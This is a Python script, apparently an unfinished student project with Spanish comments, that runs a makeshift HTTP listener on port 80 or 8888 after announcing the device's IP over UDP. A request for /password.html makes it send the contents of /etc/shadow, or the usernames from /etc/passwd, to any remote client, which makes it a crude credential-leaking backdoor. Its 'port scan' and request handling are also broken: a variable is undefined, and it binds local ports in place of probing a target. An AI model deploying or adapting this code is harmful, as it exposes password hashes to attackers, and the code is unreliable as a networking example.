import socket
#Get the device's IP
def GetIP():
    device_name = socket.gethostname()
    print("Device Name: {}".format(device_name))
    ip_device = socket.gethostbyname(device_name)
    print("Device IP address: {}".format(ip_device))
    return(device_name,ip_device)

#Send the ip to other socket using UDP
"""
esta funcion se ejecutara primero, pero no he podido hacer que cuando envie la ip, las demas funciones se ejecuten
s decir que no se porque el socket para aqui y no sigue con las demas funciones.
"""
def send_ip():
    mySocketIP = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mySocketIP.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    host = ""
    port = 8888
    mySocketIP.bind((host, port))
    #mySocketIP.listen(1)
    while True:
        client , add = mySocketIP.recvfrom(1024)
        print(client)
        #bytesIP = str.encode(str(GetIP()),'utf-8')
        client = str.encode(str(GetIP()),'utf-8')
        mySocketIP.sendto(client, add)
        break
#el problema esta aqui, el programa no pasa de esta funcion y no ejecuta las demas.
send_ip()
#get the users from /etc/passwd.
def users():
    users = []
    with open("/etc/passwd","r") as file:
        for i in (file):
            users.append(i.split(":")[0])
        return users

#get passwords from /etc/shadow.
def passwords():
    #if we run the program as superUser we'll get the content of the file.
    password = []
    try:
        with open("/etc/shadow", "r") as file2:
            for i in (file2):
                password.append(i)
            return password
    #if we ain't superUser means that we can't get the file, this return  False.
    except Exception as error:
        print(error)
        return False

#scanning ports
def scanPort(host):
    mySocket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    ports = []
    for i in range (1,1024):
        try:
            mySocket2.bind((host, i))
            ports.append("OPEN:"+str(i))
            mySocket2.close()
        except:
            ports.append("CLOSED:"+str(i))
    return ports

#creating the socket.
try:
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    print("***Socket has been created***")
except socket.error as Error:
    print("Scoket couldn't be created Error:{}".format(Error))

#connection with port 80 or 8888, if we're superUser we'll connect to port 80, else we'll connect to port 8888.
def connPort(host):
    try:
        port = 80
        conn80 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn80
    except socket.error as sudo:
        print("Error with port 80: {}".format(sudo))
        port = 8888
        conn8888 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn8888

connPort("")#prove which port have connected with.
mySocket.listen(1)#put the socket in listen mode.

#while loop 
while True:
    client, add = mySocket.accept()#accpet the onnection 
    #enviar la IP primero 
    bytesIP = str.encode(str(GetIP()),'utf-8')
    client.send(bytesIP)

    msgHost = client.recv(1024)#recive data from the client
    msgHost = msgHost.decode('utf-8')#turn the bytes into string 
    separate = msgHost.split("\n")
    url = separate[0]
    #get the IP
    scanURL = url

    #Get the domain
    urlDom = url.split(' ')
    urlDom = urlDom[1].split('?')
    getDomain = urlDom[0]
    #depending of what we get from the browser we'll send specific data
    if url == "GET /password.html HTTP/1.1\r":
        client.send(b"GOOD: Page Password found")
        if passwords():
            Bytes = str.encode(str(passwords()),'utf-8')
            client.send(Bytes)
            print("passwords sent")
        else:
            Bytes = str.encode(str(users()),'utf-8')
            client.send(Bytes)
            print("users sent")
    elif url == scanURL and getDomain == "/scan.html":
        #Get the url from browser using the split() function
        print(getHost)
        print(getDomain)

        client.send(b"GOOD: Page Scan found")
        Bytes = str.encode(str(scanPort("getHost")),'utf-8')
        client.send(Bytes)
        print("Ports sent")
    else:
        client.send(b"WRONG: Page not Found")
    client.close()
mySocket.close()
#GET /scan.html?192.168.1.1 HTTP/1.1\r